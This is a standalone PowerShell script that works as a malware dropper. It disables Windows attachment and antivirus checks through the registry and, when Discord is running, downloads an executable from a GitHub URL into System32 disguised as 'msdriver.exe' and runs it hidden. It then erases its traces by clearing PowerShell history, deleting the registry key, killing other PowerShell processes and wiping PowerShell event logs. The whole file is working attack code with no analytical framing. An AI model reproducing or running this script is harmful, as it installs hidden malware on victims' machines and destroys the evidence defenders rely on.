$destination = "C:\Windows\System32\msdriver.exe"
$url = "https://raw.githubusercontent.com/exynos69/none/main/msdriver.exe"

try {
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 2 /f | Out-Null
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 2 /f | Out-Null
    Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

    $discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
    if ($discordRunning) {
        Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Write-Host "Injection successful." -ForegroundColor Green
    }
} catch { }
finally {
    Clear-History
    $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
    if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null }
    $attachmentsRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"
    if (Test-Path $attachmentsRegKeyPath) { Remove-Item -Path $attachmentsRegKeyPath -Recurse -Force | Out-Null }
    Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
    if (-not (Test-Path $historyPath)) { New-Item -Path $historyPath -ItemType File -Force | Out-Null }
    else { Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue }
    wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object { wevtutil cl "$_" }
}